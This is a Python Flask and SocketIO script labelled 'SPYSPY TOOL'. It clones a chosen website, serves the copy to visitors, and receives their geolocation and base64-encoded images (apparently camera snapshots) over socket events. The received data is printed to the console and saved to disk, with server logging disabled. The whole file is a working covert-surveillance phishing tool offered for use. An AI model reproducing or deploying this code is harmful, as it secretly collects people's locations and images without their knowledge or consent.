from flask import Flask, render_template
from flask_socketio import SocketIO
from dotenv import load_dotenv
from bs4 import BeautifulSoup as bs
import os, requests as r
import logging, base64, time

log = logging.getLogger('werkzeug')
log.disabled = True

load_dotenv()

os.system("clear" if os.name == 'posix' else 'cls')

print("[ BAKSOKUAH ]")
print("[ SPYSPY TOOL ]")

URL = input("\n[?] URL To Forward (using http/https): ")

app = Flask(__name__)
app.config['SECRET_KEY'] = 'salisganteng'
app.logger.disabled = True
socketio = SocketIO(app)

@app.get('/')
def index():
    global URL
    html = r.get(URL).text
    soup = bs(html, 'html.parser')

    for a, b in [
        ('script', 'src'),
        ('a', 'href'),
        ('link', 'href'),
        ('img', 'href')
    ]:
        for x in soup.find_all(a, {b: True}):
            x[b] = URL + x[b]


    return render_template('index.html', html = soup.prettify())

@socketio.on('location')
def on_location(data):
    print("[!] Location :", data)

@socketio.on('image')
def on_image(data):
    image_bytes = data.split(',')[1].encode()
    image = base64.b64decode(image_bytes)
    file_path = f"static/{int(time.time())}.jpg"
    open(file_path, 'wb').write(image)
    print(f"[!] Image : http://127.0.0.1:8888/{file_path}")

if __name__ == '__main__':
    print("\n[+] Server listening in port 8888")
    print("[+] Ready to spyspy!")
    socketio.run(app, host = '0.0.0.0', port = 8888, debug = os.environ.get('DEBUG', 'False') == 'True')